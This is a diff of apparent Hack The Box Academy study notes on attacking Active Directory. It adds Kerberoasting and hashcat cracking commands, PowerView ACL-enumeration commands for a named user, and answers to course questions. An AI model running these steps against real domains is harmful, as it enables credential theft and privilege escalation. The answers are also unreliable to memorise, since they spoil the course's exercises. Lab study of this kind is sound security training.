@@ -3586,6 +3586,7 @@ Get-DomainUser * -spn | select samaccountname
 Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat
 
 # After copying the ticket to the kali machine and removing blank spaces, crack it with hashcat
+cat rc4_to_crack | tr -d \\n > hash.txt
 hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
 ```
 
@@ -3594,9 +3595,27 @@ Results: Virtual01
 ### An ACE in the Hole
 
 
-Question
+**What type of ACL defines which security principals are granted or denied access to an object? (one word)**
+Results: DACL
+
+
+**Which ACE entry can be leveraged to perform a targeted Kerberoasting attack?**
+Results: GenericAll 
+
+
+**What is the rights GUID for User-Force-Change-Password?**
+Results:
+
+
+**What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?**
+Results: ResolveGUIDs
+
+
+What privileges does the user damundsen have over the Help Desk Level 1 group?
 
 ```
+$sid2 = Convert-NameToSid damundsen
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
 
 ```
 
@@ -3621,6 +3640,15 @@ Question
 
 Results:
 
+
+
+Question
+
+```
+
+```
+
+Results:
 
 
 ## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)
